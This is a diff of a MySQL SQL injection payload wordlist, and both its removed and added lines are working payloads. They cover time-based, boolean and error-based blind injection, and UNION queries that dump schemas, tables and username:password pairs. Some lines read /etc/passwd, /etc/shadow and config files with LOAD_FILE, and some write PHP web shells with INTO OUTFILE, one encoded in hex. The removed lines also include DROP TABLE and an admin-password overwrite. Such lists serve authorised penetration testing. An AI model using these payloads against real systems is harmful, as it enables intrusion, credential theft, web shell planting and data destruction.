@@ -1,54 +1,66 @@
-'
-"
-`
-')
-")
-`)
-' -- -
-" -- -
-` -- -
-' OR '1'='1
-" OR "1"="1
-
--- comment
--- -
-/*comment*/
-/*!comment*/
-/*!50000comment*/
-
-' UNION SELECT NULL-- -
-' UNION SELECT NULL,NULL-- -
-' UNION SELECT NULL,NULL,NULL-- -
-' UNION SELECT 1,2,3-- -
-' UNION SELECT user(),version(),database()-- -
-' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
-' UNION SELECT username,password FROM users-- -
-
-' AND 1=1-- -
-' AND 1=2-- -
+' AND SLEEP(5)-- -
+'; SELECT SLEEP(5)-- -
+1 AND SLEEP(5)-- -
+1'; SELECT SLEEP(5)-- -
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+" AND SLEEP(5)-- -
+" AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+' OR SLEEP(5)-- -
+1 OR SLEEP(5)-- -
+SLEEP(5)
+' AND BENCHMARK(10000000,MD5(1))-- -
+1 AND BENCHMARK(10000000,MD5(1))-- -
+' AND 1=2 UNION SELECT 1,2,3-- -
+' AND 1=2 UNION SELECT 1,user(),3-- -
+' AND 1=2 UNION SELECT 1,database(),3-- -
+' AND 1=2 UNION SELECT 1,version(),3-- -
+' AND 1=2 UNION SELECT 1,@@hostname,3-- -
+' AND 1=2 UNION SELECT 1,@@datadir,3-- -
+' AND 1=2 UNION SELECT 1,@@basedir,3-- -
+' AND 1=2 UNION SELECT 1,@@global.secure_file_priv,3-- -
+' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
+' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
+' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'-- -
 ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
 ' AND (SELECT COUNT(*) FROM users)>0-- -
-
-' AND SLEEP(5)-- -
-' OR SLEEP(5)-- -
-1; SELECT SLEEP(5)
-'; SELECT SLEEP(5)-- -
-' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -
-
-' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
-' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
-
-' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -
-' UNION SELECT LOAD_FILE('/var/www/html/.env'),NULL-- -
-
-' UNION SELECT '<?php system($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
-
-'; INSERT INTO users VALUES('hacker','pwned');-- -
-'; DROP TABLE users;-- -
-'; UPDATE users SET password='hacked' WHERE username='admin';-- -
-
-SELECT/**/user/**/FROM/**/users
-' OR/**/'1'='1
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32-- -
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=64-- -
+' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[cmd]); ?>'-- -
+' INTO DUMPFILE '/var/www/html/shell.php'-- -
+LOAD_FILE('/etc/passwd')
+LOAD_FILE('/etc/shadow')
+LOAD_FILE('/var/www/html/config.php')
+LOAD_FILE('/etc/mysql/my.cnf')
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
+' UNION SELECT 1,2,LOAD_FILE('/etc/passwd')-- -
+'; SET @shell:=0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e; SELECT @shell INTO OUTFILE '/var/www/html/sh.php'-- -
+char(39)
+0x27
+CHAR(39)
+0x61646d696e (hex for 'admin')
+SELECT HEX('admin')
+admin' AND 1=2 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -
+admin' AND 1=2 UNION SELECT 1,CONCAT_WS(0x3a,username,password),3 FROM users-- -
+' AND 1=2 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -
+1; SHOW DATABASES-- -
+1; SHOW TABLES-- -
+1; SHOW COLUMNS FROM users-- -
+1; DESCRIBE users-- -
+1; EXPLAIN SELECT * FROM users-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@hostname),0x7e),1)-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),0x7e))-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))-- -
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) FROM users LIMIT 0,1),0x7e))-- -
+' AND 1=1# 
+' AND 1=1/*
+' /*!UNION*/ SELECT 1,2,3-- -
+' UN/*!ION*/ SE/*!LECT*/ 1,2,3-- -
+' AND 1=2 UNION SELECT 1,(SELECT user FROM mysql.user LIMIT 0,1),3-- -
+' AND 1=2 UNION SELECT 1,(SELECT password FROM mysql.user LIMIT 0,1),3-- -
